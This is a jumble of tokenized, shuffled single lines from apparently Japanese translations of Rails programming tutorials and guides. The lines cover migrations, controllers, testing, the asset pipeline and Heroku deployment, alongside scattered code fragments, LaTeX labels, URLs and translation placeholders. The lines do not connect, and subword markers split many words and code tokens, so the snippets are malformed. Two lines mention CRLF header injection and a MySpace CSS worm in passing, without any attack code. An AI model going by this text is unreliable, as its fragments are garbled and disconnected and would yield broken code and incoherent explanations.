▁ インデックス 自体 は 一意性 を 強 制 しません が 、 オプションで \ k ode { uniq ue : ▁true } を指定する ことで 強 制 できるようになります 。
▁この 正規表現 を理解する ために 、 お 手 頃 な サイズ に 分割 して 表 \ ref { table : valid _ email _ regex } に まとめ ました
▁* ▁` stylesheets ` は 、 ジェネレータ で スタイルシート の フック を行なう かどうかを指定します 。
▁User ▁add ▁some ▁examples ▁to ▁( or ▁delete )
▁最後に この クラウド IDE ですが 、 たとえ 今後 使う ことが ない としても ▁( 筆者 としても 、 他の エディタ の使い方 も ぜ ひ 知 っ ておく 必要がある と 考え ています ) 、 テキストエディタ などの 開発 ツール で 一般に どんな ことができる のか を 知 っ ておく には 最適です 。
▁\ k ode { generate } スクリプト では アクション 名を まとめて 指定 すること も できる ので 、 コマンドラインで Home ページ と Help ページ 用の アクション も まとめて 生成する ことにします ▟ なお 、 About ページ だけ は 学習 の ため 、 あえて コマンドラインで は 作成 せず 、\ ref { sec : getting _ started _ with _ testing } で 手動で 追加する ことにします 。
▁create
▁< th > Title </ th >
▁@ article ▁= ▁Article ▖ new ( article _ params )
▁ 実行 に 時間 のか か る 行 や 、 ボ ト ル ネ ッ ク になる 可能性のある 行 を この ブロック で 囲 み 、 実行 に か か った 時間 を 読み 取り ます 。
▁このオプション の値 は 範囲 で なければなりません 。
▁ コントローラは 、 アプリケーション に対する 特定の リクエスト を受け 取 って 処理 する のが 役 割 です 。
▁\ k ode { rspec } コマンドは 、 テストの たびに コマンドライン に移動し て 手動で コマンドを実行 し なければならない 点が 面倒 です
▁これ と 同等の SQL は以下のようになります 。
▁この 削除リンク が動作する ためには 、\ k ode { destroy } アクション ▁( 表 \ ref { table : RESTful _ users }) ▁ を追加する 必要があります ▟ この アクション では 、 該当する ユーザー を見つけ て Active ▁Record の \ k ode { destroy } メソッドを使用して 削除 し 、 最後に ユーザー インデックス に移動し ます ▁( リスト \ ref { code : destroy _ action }) 。
▁ そう い う わけで 、 リモート リポジトリ はデフォルトで 非 公開 である のが 望 ま しく 、 なるべく 安全 側 に 倒 しておきたい と 考え ます 。
▁ マイグレーション ファイル名 の 先 頭 には 、 それが 生成された 時間 の \ emph { タイムスタンプ } が追加され ます 。
▁ レコードが ない場合は ` create ` が呼び出され ます 。
▁ アプリケーションを 一 気 に 検 査 する 自動 テスト がない と 、 変更 点 をすべて 手動で 確認し なければ な らず 膨大な 時間 が か か ってしまいます 。
▁このガイドでは 、 Ruby ▁on ▁Rails ▁( 以下 ▁Rails ) ▁ を 初めて 設定 して 実行する まで を 解説します 。
▁ 新しい リンクを レイアウト に追加する ときに 、 Bootstrap の 機能 を使用して ド ロ ッ プ ダ ウ ン メニュー を 実現 しましょう ▟ 詳細については 「\ href { http :// get bootstrap ▖ com / 2▖ 3▖2 / components ▖ html } { Bootstrap コンポーネント } ▁( 英語 )」 を参照してください 。
▁end
▁2▖ years ▖ from _ now
▁` collection ▖ where ` メソッドは 、 コレクション に含まれている メソッドを 指定された 条件 に基いて 検索 します ▟ このメソッド では オブジェクトは 遅 延 読み込み ( lazy ▁load ) される 点にご注意ください ▟ つまり 、 オブジェクト に 実際に アクセス が 行われ る 時に だけ データベース への クエリ が発生し ます 。
▁今度は テストスイート が ▁\ passing ▁ するはずです 。
▁ マイクロポストの index ページ ▁(\ href { http :// localhost :3000/ microposts }{/ microposts })
▁ これはリスト \ ref { code : failing _ validates _ name _ test } で使用されていました 。
▁そこで 、 今 Twitter の慣習 に なら い 、 本チュートリアル では \ emph { following } という 呼 称 を採用し ます ▁( 例 : ▁“ 50 ▁following , ▁7 5 ▁followers ” )▟ したがって 、 ある ユーザーが フォローしている すべての ユーザーの 集合 は \ k ode { c al v in ▖ following } となります 。
▁def ▁ discount _ cannot _ be _ greater _ than _ to t al _ value
▁もし 手 頃 な トピック があれば 、 関連する RailsCast を ウ ォ ッ チ することで 、 時間 を 大 幅 に 節 約 できる ことでしょう 。
▁* ▁application - wide ▁style s ▁to ▁this ▁file ▁and ▁they ' ll ▁appear ▁at ▁the ▁to p ▁of ▁the
▁end
▁`: as ` オプションを使用すると 、 名前付き ルーティングヘルパー を上書き して 異なる 名前 を使用できます 。
▁** クエリ パラメータ 以外に ファイル名 に 違い の ない コンテンツ は 確 実に キャッシュ され ないこと がある **
▁Git リポジトリを 初期化 して 最初の コミット を実行し ておきます 。
▁ 配列 のインスタンス 名 には " @ " 記 号 が含まれます 。
▁ そんな ふ う に うまく い く とは 信 じ ら れ ない 人 も い る かもしれませんが 、 一度 でも テスト 作成 が 上 達 すれば 間 違い なく この とおり になります ▟ だ から こ そ 、 テスト 作成 の 習慣 を できる だけ 早い うちに 身につけ ること が 重要な のです 。
▁respond _ to ▁do ▁| format |
▁Rails では 、 こう い う 場合に \ emph { flash } という 特殊な 変数 を使用できます ▟ この 変数 は ハッシュ のように 扱 う ことができます 。
▁ 一 方 、 C h r o me を 閉 じ たとき 、\ k ode { session [: user _ id ]} は \ k ode { nil } になります ▁( これは ブラウザ が 閉 じ たときに 、 全て の セッション 変数 の 有効期限 が 切 れる ためです )▟ しかし 、\ k ode { cookies } は ブラウザ の中に 残 り 続けて い るため 、 データベースから そのユーザー を見つけ ること が できてしまいます 。
▁### ▁URL を 実際の コード に 割 り 振 る
▁` where ` は 、 関連付け られる オブジェクトが 満 た すべき 条件 を指定します 。
▁TIP : ▁ 現在 と同じ コントローラのアクション にリンクする 場合は 、` controller ` の 指定 は 不要 です ▟ デフォルトでは 現在の コントローラ が 使用される からです 。
▁Git ▁ で バージョン管理 を している場合 は 、 次の コマンドで トピックブランチを作成 してください 。
▁この場合 、\ text tt { f ound _ user } 変数 は \ text tt { let } によって メ モ 化 され 、\ text tt { find _ by } メソッドが 実際に 呼び出される のは User モデルの spec が 実際に 実行される とき だけ となります 。
▁<%= ▁link _ to ▁' A d ▁details ', ▁url _ for ( [ @ magazine , ▁@ ad ]) ▁%>
▁#### # ▁`: layout ` オプション
▁最初に 、 Sessions コントローラと \ k ode { new } アクション を生成します 。
▁- 1 34 ▖ ordinalize ▁# ▁=> ▁" - 1 34 th "
▁ http :// my cdn subdomain ▖ fi ctional - cdn ▖ com / assets / s m ile ▖ png
▁次の 段 階 として 、` Object ` に対する すべての 拡張機能 を 単 に 読み 込 んで みましょう 。
▁Time ▖ local (200 0, ▁5 , ▁31)▖ prev _ quarter ▁# ▁=> ▁Tue , ▁29 ▁Feb ▁2000
▁╼╼ ▁\ subsection { [ フォローする ] ▁ ボタン ▁( 標準的な 方法 )} ▁% ▁( fold )╼ ▁\ label { sec : a _ working _ follow _ button _ the _ standard _ way }╼╼
▁ デフォルトの 設定 とは異なり 、 WEBrick を使用して アプリケーションを production モード で 実行 したり ( これは 絶対に や ら ないでください ) テスト する 場合は true に設定されます 。
▁ これを行うには \ href { http :// en ▖ w ikipedia ▖ org / wiki / C all back _ ( computer _ science ) }{\ emph { コールバック } } という テクニック を 利用 します ▟ コールバック とは 、 Active ▁Record オブジェクトが 持 続 している 間 の どこか の 時点 で 、 Active ▁Record オブジェクト に 呼び出し てもらう メソッドです ▁( Rails ▁API の 「\ href { http :// api ▖ rubyonrails ▖ org / v 4▖0▖0 / classes / ActiveRecord / Callbacks ▖ html } { コールバック の 登録 ポイント } ▁( 英語 )」 を参照してください ) 。
▁D O C TYPE ▁ html >
▁# ▁gem ▁' lib notify ', ▁' 0 ▖ 8 ▖ 0 '
▁{0}{1} リスト 1 ▖3{/1}{/0} の 下 の方 にご注目ください ▟\ k ode { rails ▁new } を実行すると 、 ファイル の作成 後に \ k ode { bundle ▁install } コマンド が自動的に 実行 されています 。
▁\ k ode { Gemfile } に Factory ▁Girl を追加する 。
▁ここでは 、\ k ode { home } アクション の 中 身 は 空 なので \ k ode { nil } が返されます 。
▁リスト \ ref { code : remember _ me _ checkbox } では 、2 つの CSS クラス \ k ode { checkbox } と \ k ode { inline } を インクルード しています ▟ Bootstrap では これら を チェックボックス と テキスト 「 Remember ▁me ▁on ▁this ▁computer ” 」 として 同じ 行 に 配置 します 。
▁ エラー ページ など 、 一 般 ( Web ブラウザ など ) に 直接 公開 する データ
▁たとえば 、 サンプルアプリケーション \ k ode { production ▖ rb } の 設定ファイル は以下のように 表 します
▁</ head >
▁最後に 、 三項演算子 を 関数 の 戻り値 として 使用する ことも よく あります 。
▁`: layout ` オプション を指定すると 、 現在の アクション に対して 特定の ファイルを レイアウト として 使用します 。
▁ アカウント有効化 の テキスト ビュー
▁ 関連付け で 強制的に 一意 になるように するために ` include ?` を使用 しないでください 。
▁ ステータスフィード の パーシャル は 以下のコード を使う という 点 で 、 フィード ア イ テ ム の パーシャル に表示される フィード ア イ テ ム と 異なります 。
▁ 非推奨 警 告 が表示され ないようにする には 、 test 環境 に 以下の 記 述 を追加します 。
▁# ▁=> ▁< text area ▁ col s =" 20 " ▁rows =" 30 " ▁id =" comment _ text " ▁name =" comment [ text ] ">
▁ユーザーの \ k ode { microposts } 属性 に対するテスト 。
▁ バグ を再 現 するために 有 用 な 情報 を追加した り 、 不要な 手順を 削除 したり する の も 重要な 貢献 です 。
▁=> ▁" test "
▁ アセットパイプライン の 第 3 の 機能 は 、 より 高 級 な 言語 を使用した コーディング の サポート です ▟ これらの 言語 で 記 述 された コードは プリコンパイル され 、 実際の アセット になります 。
▁exist ▁app / views / microposts
▁* ▁Rails ▁4▖0 で ルーティング に ` match ` を使用する場合 は 、 リクエスト メソッドの 指定 が 必 須 となり ました 。
▁ メールの 正規表現 を 分 解 した結果
▁ サイドバー のマイクロポスト カウント のテスト を追加 してください ▟ このとき 、 表示 に 単数形 と 複数形 が正しく 表示 されている かどうか も テスト してください 。
▁self を省略した 結果を リスト \ ref { code : users _ fixtures _ extra _ users } に示します 。
▁* = ▁require _ tree ▁ ▖
▁ セキュリティ モデル を確認する ために before フィルター を コメントアウト する
▁` XmlHttpRequest ` を明示的に テスト してください 。
▁Spork 向 け に 更新 した \ k ode { Guardfile } 。
▁#### ▁` test ` ディレクトリ
▁orders ▖ where (▖▖▖)
▁ここで 、 users \_ path に POST リクエストを送信する ために 、\ k ode { post \_ via \_ redirect } という メソッドを使って いることに注目してください 。
▁[ Settings ] ▁ リンク のテスト を追加する 。
▁ テストは 最初は 赤色 ▁( 失敗 ) 、 次に 緑色 ▁( 成功 ) ▁ になるように してください
▁ 仮 想 の \ k ode { password } 属性 は \ k ode { has \_ secure \_ password } メソッドで 自動的に 作成 でき ましたが 、 今回は \ k ode { remember \_ token } の コードを 自分で 書く 必要があります 。
▁#### ▁number _ with _ delimiter
▁Rails は 、 データ スト ア の詳細 から ほぼ 完全に 私 た ち を 切り 離 してくれます 。
▁ アカウント有効化 リンクを メール送信 する
▁ テストスイート は 期待どおり パス ( \ passing ) ▁ します
▁< li >`: test `: ▁-- ▁ メールを 配列 ` ActionMailer :: Base ▖ deliveries ` に保存 する ▟ </ li >
▁ テーブル に含まれる フィールド の 最大 値 を得る には 、 その テーブル を持つ クラス に対して ` maximum ` メソッド を呼び出します 。
▁$ ▁ sqlite 3 ▁-- version
▁以上で お しま い です 。
▁> > ▁5 ▖ me g abytes
▁ モデル 注 釈
▁# ▁ 現在のユーザー を ログアウト する
▁JavaScript の 開発者 は 、 ブラウザ と JavaScript という 2 つの 力 を 1 つ に 結 集 させる ことで 、 現在の Web ページ の一部 だけ を更新する ことができます ▟ 必要な Web ページを サーバー から すべて 取得 する必要はありません 。
▁* ▁` before _ initialize `: ▁これは 、`: bootstrap _ hook ` イニシャライザ を含む 初期化 プロセス の 直前に 、 直接 実行されます ▟ `: bootstrap _ hook ` は 、 Rails アプリケーション 初期化 プロセス のうち 比 較 的 最初の 方 に あります 。
▁なお 、\ k ode { follower } の関連付け については 、\ ref { sec : following } に 入 る まで は 使い ません ▟ しかし follower と followed を 対 称 的に 実装 しておくこと で 、 構造 に対する 理解 は 容易に なる はずです 。
▁ パスワード を簡単に 当 て ら れ ないようにする ために 、 パスワード の 最 小文字 数を 設定 しておくこと は 一般に 実 用 的 です 。
▁C ▖ subclasses ▁# ▁=> ▁[]
▁ http :// www ▖ c b s new s ▖ com / st or ies / 200 2 / 02 / 15 / we at her _ local / main 50 16 44 ▖ s html ? z ip code = 1 - - >
▁その 分 時間がかかる ことになります が 、 どう か 最 後 まで 本書 に お 付き 合 い いた だけ れば と思います ▟ 本書 の目的は 、 scaffold を使用した 即 席 の アプローチ による 表 面 的な 理解 ではなく 、 そこ を \ emph { 突 破 して } Rails を 深 い レベル まで 理解 すること に あります 。
▁create _ customer
▁ 以後 、 本ガイド では 基本的に この ディレクトリ を 中 心 に 説明 を行います 。
▁2 つの モデルの 間 に 1 対 1 の関係 を 作り たい のであれば 、 いずれ か 一 方のモデル に ` belongs _ to ` を追加し 、 もう 一 方のモデル に ` has _ one ` を追加する 必要があります 。
▁これで 、 すべての テストが \ passing するはずです 。
▁ 移動 先 の ページ で フラッシュメッセージ が 表示 \ emph { されていない } ことを確認する
▁# ▁ 残 り すべての ルーティング
▁\ label { fig : cloud 9 _ two _ space s } }╼\ end { figure }╼╼\ subsection { Rails をインストール する } ▁% ▁( fold )╼\ label { sec : installing _ rails }╼╼ The ▁development ▁environment ▁from ▁Section ~\ ref { sec : development _ environment } ▁includes ▁all ▁the ▁software ▁we ▁need ▁to ▁get ▁started ▁except ▁for ▁Rails ▁itself ▖
▁#### ▁ label _ tag
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁この セクション のコード では 、\ href { http :// github ▖ com / thoughtbot / clear ance } { thoughtbot } 社 が提供する \ href { http :// thoughtbot ▖ com /}{ C le ar ance } ▁gem を 適用 しています 。
▁(\ ref { sec : uniqueness _ validation } で 、 マイグレーション を 一 から 手動で 作成する 方法 について説明します 。
▁` prev _ month ` は ` last _ month ` の別名 です 。
▁=> ▁[ 42, ▁ 8, ▁17 ]
▁### ▁ 旧 バージョンの Ruby ▁on ▁Rails
▁リスト \ ref { code : relationships _ controller _ ajax } で Ajax リクエスト に 対応 した ので 、 今度は ブラウザ 側 で JavaScript が 無効 になって い た場合 ▁( Ajax リクエストが 送 れ ない場合 ) ▁ でも うまく 動く ようにします ▁( リスト \ ref { code : de grade _ gr a ce full y }) 。
▁ パスワード と パスワード の 確 認 が 一致する かどうか も テスト する必要があります 。
▁<%= ▁f ▖ label ▁: body ▁%>< br >
▁# ▁B un d le ▁ ed ge ▁Rails ▁instead :
▁ プログラミング 経験 の ない 方は 多少 苦 労 すること も ある と思います が 、 どう か 諦 め ずに 頑 張 ってください 。
▁ トップレベル の 見 出 し ▁(\ k ode { < h 1> }) ▁ が \ k ode { Sample ▁App } に 変更 された ため 、 上のコード は テストにパス します 。
▁リスト \ ref { code : validate _ picture _ format } や リスト \ ref { code : micropost _ model _ image _ validation } で定義した 画像 のバリデーション を ビュー に 組み 込 む ために 、 クライアント側 に 2 つの 処理 を追加しましょう 。
▁この チェック は 、` email _ confirmation ` が ` nil ` で ない場合 のみ 実 施 されます 。
▁Rails では 、 データベースの テーブル名 を見つけ る ときに 、 モデルの クラス名 を 複数形 に したものを 使用します 。
▁{0} 図 7▖2 0 {/0} {1} ユーザー登録 が 成功 し 、 フラッシュメッセージ が表示される ▟\ href { http :// railstutorial ▖ org / images / figures / signup _ flash _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁< p >
▁### ▁ Uni code 文字列を ルーティング で使用する
▁create ▁app / assets / stylesheets / scaffold ▖ css
▁now ▖ all _ month
▁* ▁`: layout `
▁` prev _ month ` および ` next _ month ` と 基本的に 同じ要領で 動作します 。
▁create ▁app / views / microposts / _ form ▖ html ▖ erb
▁ あるいは 、 既存の ` secret _ key _ base ` を ` secret _ token ▖ rb ` イニシャライザ から ` secrets ▖ yml ` の production セクション に コピー し 、 ' <%= ▁ ENV [" SE C RE T _ KEY _ BASE "] ▁%> ' を 置き換え ることもできます 。
▁config ▖ action _ mailer ▖ raise _ delivery _ errors ▁= ▁true
▁create _ account !
▁` <%= ▁javascript _ include _ tag ▁params [: controller ] ▁%> ` ▁ または ▁` <%= ▁stylesheet _ link _ tag ▁params [: controller ] ▁%> `
▁resources ▁: articles
▁### ▁ ラ ッ ピ ング
▁ 現在の Rails の ビュー では 、 安全 でない 値 は自動的に エスケープ される ためです 。
▁xml ▖ div ▁ {
▁ 最初は 、 Git に 付 属 する \ k ode { mv } コマンド ▁( 注 : ▁Unix の mv コマンド ではありません ! ) ▁ を使って README の 拡張子 を 変更します 。
▁ メイラー も同様に 名前空間化され ます 。
▁#### ▁` auto _ discover y _ link _ tag ` を使用して フィード にリンクする
▁Bitbucket に 最初の アプリ の リポジトリ を作成する 。
▁\ ref { sec : a _ user _ class } の コンソール セッション では \ k ode { User ▖ new } で 新しい ユーザー オブジェクト を生成し ましたが 、 リスト \ ref { code : example _ user } の example \_ user ファイルを 明示的に require する まで この オブジェクト には アクセス できません でした 。
▁| ▁ ファイル / フォルダ ▁| ▁ 目的 ▁|
▁図 \ ref { fig : login _ page _ protected _ mockup } のように 転 送 させる 仕 組み を実装 したい ときは 、 Users コントローラ の中で \ emph { before フィルター } を使います 。
▁ただし Users リソース と 異なる のは 、 Users リソース では バックエンド で User モデルを 介 して データベース上の 永続的 データ にアクセス する の に対し 、 Session リソース では 代わりに cookies を 保存 場所 として 使用する 点 です ▟ ログイン の しく み の 大 半 は 、 cookies を使用した 認 証 メ カ ニ ズ ム によって 構 築 されています 。
▁ シンプルな テキストエディタ 「\ k ode { na no }」 を使って 、 ホ ーム ディレクトリに 「 ▁\ k ode { ▖ irbrc }」 ファイルを 作 って みましょう ▁( リスト \ ref { code : irbrc }) 。
▁form _ for
▁<%= ▁render ▁@ article ▖ comments ▁%>
▁つまり 、 ▁ _ ヘッダー インジェクション における 攻 撃 方法は 、 ヘッダー に CRLF 文字 を 注入 する という もの なのです 。
▁最後に 、 サイト 内 移動 用の ヘッダー に ユーザー 一覧 表示 用の リンク を追加します ▟ これ には \ k ode { users \_ path } を使用し 、 表 \ ref { table : RESTful _ users } に 残 っている 最後の 名前付きルート を 割り当て ます 。
▁Home ページ 用に 生成された ビュー
▁( これは \ ref { sec : edit _ form } で 実現 します ) 。
▁ ファイル名
▁ ブラウザ 関連の ミドルウェア を削除する には 次のように 書き ます 。
▁{0} 図 2▖ 6 ▁{/0}{1} ユーザー 表示 用の ページ ▁(\ href { http ://0▖0▖0▖0:3000/ users /1}{/ users /1 }) {/1}
▁リスト \ ref { code : logo _ css } の CSS は 、 テキスト を 大文字 に変換 し 、 サイズ 、 色 、 配置 を 変更します
▁ サンプルアプリケーションの テスト は既に 完了 している ので 、 Web サイトの 機能を 損 な う こと なく 安 心 して リファクタリング に 取り か か れ ます 。
▁ これはリスト \ ref { code : sign _ in _ function } で使用されていました 。
▁ この時点では 、 テストは ▁\ passing ▁ になるはずです 。
▁<%= ▁stylesheet _ link _ tag ▁" application ", ▁debug : ▁true ▁%>
▁[ ` form _ tag ` ]( http :// api ▖ rubyonrails ▖ org / classes / ActionView / Helpers / FormTagHelper ▖ html # method - i - form _ tag ) ▁ は ` form _ for ` と よく 似 ています 。
▁ 同様に 、` all _ week `、` all _ month `、` all _ quarter `、` all _ year ` も 時間 の 範囲 を 生成 できます 。
▁この フォルダ は 、 複数の デプロイ によって 共有 されている 点 が重要です ▟ これは 、 サーバー 以外の 離 れ た 場所 で キャッシュ されている ページ が 古 い コンパイル 済み アセット を参照 している場合 でも 、 キャッシュ 済み ページの 寿 命 が 来 て 削除 される まで はその 古 い ページ への 参 照 が 有効 になるように する ためです 。
▁` app / assets / javascripts ` に置かれている JavaScript アセット への URL を算出 します 。
▁ あるいは 「 悪 い け ど それ は 採 用 でき そう に ない ね 」 という 返 信 かもしれません 。
▁これ だけで も かなり の 量 ですが 、 Rails について 学ぶ べ き こと はまだ まだ たくさん あります 。
▁最初の 行 では 、 Home ページ に対するテスト であること を記述し ています 。
▁このコードは リスト \ ref { code : help _ view _ full _ html } で使用されていました ▟ もうひとつ 、
▁content _ type : ▁" text / plain ",
▁ サーバー ログ に 表示 された アカウント有効化 メールの 例
▁たとえば 、 Gemfile に 以下のような 記 述 が あるとします 。
▁たとえば 、 自分の アプリケーションで 、 すべての ユーザー には 必ず 電 子 メールアドレス と メ ー リ ング リスト アドレス が必要 だと します 。
▁ 最後の 図 \ ref { fig : user _ profile _ microposts _ page _ 2 _ rails _3} では 、 最初の ユーザーの \ emph { 2 番目 } の ページ と 、 下 部 にある ページネーション のリンク を表示し ています 。
▁ RubyGems のインストール
▁Heroku 上で 動作 している Rails チュートリアル の最初の アプリケーション ▟\ href { http :// railstutorial ▖ org / images / figures / heroku _ app _4_0 - full ▖ png }{( フル サイズ )}
▁ この問題 を解決する ためには 、\ k ode { full _ title } ヘルパー に対する テストを書く 必要があります ▟ そのために 、 Application ヘルパー をテストする ファイルを作成し 、 リスト \ ref { code : full _ title _ helper _ tests } の \ k ode { FILL _ IN } のような コード を書いて みましょう 。
▁ その他の 点 は ` form _ for ` と同じ です 。
▁time _ range ▁= ▁( Time ▖ now ▖ midnight ▁- ▁1▖ day )▖ ▖
▁上のコード を実行すると 、 以下のような SQL が生成されます 。
▁``` html + erb
▁@ document ▖ p ar a gr a ph s
▁( Home ページの 統 計 情報 は 別の テスト に してみ ません か ▟)
▁\ text tt { rails _ 12 factor } ▁gem が追加され ている点に注目してください ▟ これは 画像 や スタイルシート などの 静 的な アセット を提供 するために Heroku で 使用されます ▟ [ B R ] ╼[ B R ] ╼ また 、 sqlite 3 ▁gem が 本番環境 には 含まれていない 点 にも 注 目 してください ▟ これは 、 今回の 本番環境 である Heroku では SQLite 3 をサポートしてい ない ため 、 明示的に 本番環境 から sqlite 3 ▁gem を 外 す 必要があります ▁( 本番環境 に含め てしまう と 、 デプロイ 時に エラーが発生し ます ) 。
▁ これはリスト \ ref { code : micropost _ dependency _ test } で使用されていました 。
▁ コントローラ レベルで 指定された レイアウト では 、`: only ` オプション と `: except ` オプション が サポート されています 。
▁ ログインフォーム は 、 ユーザーがログイン するための 新しい セッション を作成する ように 設計 されています 。
▁ 詳 しく は 、 Heroku の \ href { https :// dev center ▖ heroku ▖ com / articles / error - pages } { エラー に関する ページ } ▁( 英語 ) ▁ にある ドキュメント を参照してください 。
▁ 多くの テスト ツール では 、 テストの 失敗 を 「 レ ッ ド 」 、 成功 した とき を 「 グ リ ー ン 」 で 表 します ▟ ここ から 、 この サイクル を 「 レ ッ ド ・ グ リ ー ン ・ リファクタリング 」 と呼ぶ こともあります 。
▁ ユーザーが ログアウト できるように するために 、 ユーザーを 記 憶 するための メソッドと 同様の方法で 、 ユーザーを 忘れ るため の メソッド を定義します 。
▁これらの 概念 についても 、 この章 で すべて 説明します 。
▁ ユーザープロファイルページ を作成する には 、 その前に データベースに ユーザーが 登録 されている 必要があります ▟ これは いわゆる 「 卵 が 先 か 鶏 が 先 か 」 問題 です ▟ この Web サイト では 、 登録 ページ がない 状態 で どうやって ユーザーを 登録 しておけば よいでしょう か 。
▁{0} 図 11 ▖ 12 {/0} {1} ある ユーザープロファイル ▁(\ href { http :// localhost :3000/ users / 2 }{/ users / 2 }) ▁ に ▁[ Follow ] ▁ボタンが表示されている ▟ ▁\ href { http :// railstutorial ▖ org / images / figures / profile _ follow _ button _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁* ▁` stylesheet _ engine ` は 、 アセット 生成 時に 使用される 、 sass などの スタイルシート エンジン を指定します 。
▁Un k now n ▁action ▁new ▁for ▁Article sController ! ](
▁ MySpace では 多くの タグ を ブロック していました が 、 CSS については 禁 止 して い なかった ので 、 ワーム の 作 者 は CSS に 以下のような JavaScript を 仕 込 み ました 。
▁ これはリスト \ ref { code : name _ title _ and _ head ing } で使用されていました 。
▁{0} リスト 2▖ 5 {/0} ▁╼╼{1} To y アプリケーションの 簡潔 な ユーザー \ k ode { index } アクション {3} {/3} ▁ { 4 } app / controllers / users _ controller ▖ rb {/4} {/1}
▁次に 、 ▁リスト { p 0} で定義した {2} log _ in _ as {/2} メソッドを使って 、 {2} edit {/2} アクションと {2} update {/2} アクション をテストします ▁( リスト \ ref { code : edit _ update _ wrong _ user _ tests }) 。
▁最初の Sessions コントローラ 。
▁ これはリスト \ ref { code : flash _ test } で使用されていました 。
▁1 つの イベント で 複数の コールバック を使用したい場合 には 、 配列 を使用して 渡します 。
▁リスト \ ref { code : user _ index _ view } では 、\ ref { code : gravatar _ option _ redux } の演習 の リスト \ ref { sec : exercises _ a _ gravatar _ image } の結果 を利用して います ▟ これは 、 Gravatar ヘルパー に デフォルト 以外の サイズ を指定する オプションを 渡します 。
▁NOTE : ▁` belongs _ to ` 関連付け で 指定 する モデル名 は 必ず 「 単数形 」 に し なければなりません 。
▁* = ▁require _ tree ▁ ▖
▁最初に 、 パーシャル を定義する と レイアウト が どのように 変わる か を見てみましょう ▁( リスト \ ref { code : layout _ with _ partial s }) 。
▁" 0 ▁microposts "
▁ このコード には \ k ode { password _ digest } 属性 の検証 も含まれます ▟)
▁ 通常 、 これらの アクションは 、 ページを 出力 せずに データベース上の ユーザー情報 を 操作 します ▁( もちろん ページを 出力 し よう と 思 えば できます が ) 。
▁* ▁`: polymorphic `
▁S trong ▁Parameters を使う ことで 、 安全 に Web 上 から 更新 させる ことができる
▁ 今回は まず 、 コントローラのアクション にアクセスすると き 、 ログイン 済み に ユーザー である かどうかをチェックします ▟ ▁もし ログイン し ていなければ 、 ログイン ページに リダイレクト させ 、 Relationship の カウント が 変 わ って いない ことを確認します ▁( リスト \ ref { code : relationships _ access _ control }) 。
▁` with _ options ` ブロック の内側に ある すべての バリデーション には 、` if : ▁: is _ admin ?` という 条件 が渡され ます 。
▁この ヘルパー のデフォルト メッセージ は ▁_" does n ' t ▁match ▁confirmation " _ ▁ です 。
▁d ▁= ▁Date ▖ new (201 2, ▁ 9 , ▁ 16 ) ▁# ▁=> ▁Sun , ▁ 16 ▁Sep ▁2012
▁production 環境 の場合
▁これにより 、 モデル は以下のようになります 。
▁その 理由 を 考え てみてください 。
▁ オブジェクトが 本当に 削除 された かどうかを どのように して 知 れば よいでしょう か 。
▁-> ▁0▖0 0 19 s
▁上の \ k ode { users } は フィクスチャ の ファイル名 \ k ode { users ▖ yml } を表し 、\ k ode { : michael } という シンボル は リスト \ ref { code : real _ user _ fixture } のユーザー を参照 するための キーを 表 します 。
▁ これはリスト \ ref { code : successful _ edit _ test } で使用されていました 。
▁これで 、 ユーザー 有効化 機能 の お お ま か な 部分 については 実装 で きました
▁ユーザー登録 後に サインアップ する 。
▁### ▁` find _ or _ initialize _ by `
▁ 今回の StaticPages コントローラ にある メソッドは 、 以下のように どちらも 最初は 空 になっています 。
▁NOTE : ▁ 直接 の関連付け では ` includes ` を使用する 必要はありません ▟ ` Order ▁belongs _ to ▁: customer ` のような 直接 の関連付け では 必要に応じて 自動的に eager - load されます 。
▁ 簡単な Rails アプリケーション を例にとって 説明 しましょう ▟ この アプリケーション には 顧客 用の モデル ( Customer ) と 注文 用の モデル ( Order ) があります 。
▁layout ▁false
▁ 他にも 、\ href { http :// ent p ▖ com /}{ E N T P } ▁ や ▁\ href { http :// thoughtbot ▖ com /}{ thoughtbot }、\ href { http :// p ivotal lab s ▖ com /}{ P ivotal ▁L abs }、\ href { http :// h ashrocket ▖ com /}{ H ashrocket } ▁ といった 、 Rails ▁ を 専 門 的に 扱 う 会 社 も 数 多く あります ▟ また 、 Rails ▁ を 専 門 にした フ リ ー ラン ス の コ ン サ ル タ ン ト や イン スト ラ ク ター 、 開発者 については 、 数 え 切 る のが 難 しい ほど です 。
▁( テスト 環境で デバッグ情報 が表示され ても 直接 問題 になる ことはありません が 、 よい こと ではありません ▟ デバッグ情報 は 開発環境 以外 では 使用 すべき ではありません ▟)
▁この節では 、 一 人 ぼ っ ち の ユーザーに 仲 間 を 加えて あ げ る ことにします 。
▁ オブジェクト に \ k ode { before \_ save } コールバック を用意し ておく と 、 オブジェクトが保存される 直 前 、 オブジェクト の作成 時 や 更新 時に その コールバック が呼び出され ます ▟ しかし 今回は 、 オブジェクト が作成され たとき だけ コールバック を呼び出し たい のです ▟ それ以外の ときには 呼び出し たくない のです 。
▁<%= ▁submit _ tag ▁%>
▁ この時点で 、 すべての テストが パスするはずです 。
▁ 与えられた パス が 認 識 可能 であること 、 アプリケーションの 特定の 場所に ルーティング される こと をテストする アサーション です 。
▁### ▁` rails ▁server `
▁#### ▁ 重要な ファイル
▁ テスト駆動開発 用に \ k ode { has _ secure _ password } を コメントアウト する 。
▁#< Client ▁id : ▁ 22 0, ▁first _ name : ▁" S ar a ">
▁var ▁= ▁boolean ? ▁?
▁### ▁ Cache Helper
▁` create _ association ` メソッドは 、 関連付けられた 型の 新しい オブジェクトを返します 。
▁ Asset ▁Pipeline を使うと 、 この 「 開発 効率 と 読み込み 時間 のどちら を 重 視 するか 」 という 問題 について 悩 む 必要 が なくなります ▟ 開発環境 では プログラマ にとって 読みやすい ように 整 理 しておき 、 本番環境で は Asset ▁Pipeline を使って ファイルを 最小化 すればよいのです 。
▁This
▁ サインイン フィーチャー が パス するための 完全な ステップ 定義 。
▁この章では 、 Rails の 強力な 機能 をいくつか 紹 介 するための お も ち ゃ アプリケーション を作成します 。
▁この メソッド呼び出し は 以下のような もの になります 。
▁上 を ` Client ` モデルに 追加 した とします 。
▁ プリコンパイル の 対象 となる アセット は ` engine ▖ rb ` で 定義 できます 。
▁ ブラウザ に表示されている リンクをクリックすると 、 同じ プロセス が 実行されます ▟ ブラウザは ページ を取得し 、 続いて アセット を取得し 、 それら をすべて まとめて から 結果 を表示します 。
▁これにより 、` config / initializers / wrap _ parameters ▖ rb ` ファイルの 以下の オプションを コメントアウト したり 削除 したり できるようになりました 。
